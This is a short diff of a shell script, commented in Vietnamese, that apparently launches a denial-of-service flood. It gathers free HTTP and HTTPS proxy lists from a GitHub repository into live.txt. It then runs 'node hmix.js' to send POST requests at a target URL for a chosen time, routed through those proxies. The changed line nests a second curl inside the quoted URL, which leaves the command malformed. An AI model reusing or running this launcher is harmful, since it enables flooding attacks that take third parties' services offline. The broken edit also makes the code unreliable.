@@ -10,7 +10,7 @@ TIME=$2
 #"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=99999&protocol=${type}"
 # Tải proxy loại HTTP, HTTPS, SOCKS4, SOCKS5 vào live.txt 
 for type in http https; do
-  curl -s "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/${type}.txt"
+  curl -s "curl "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/${type}.txt"
 done > live.txt
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
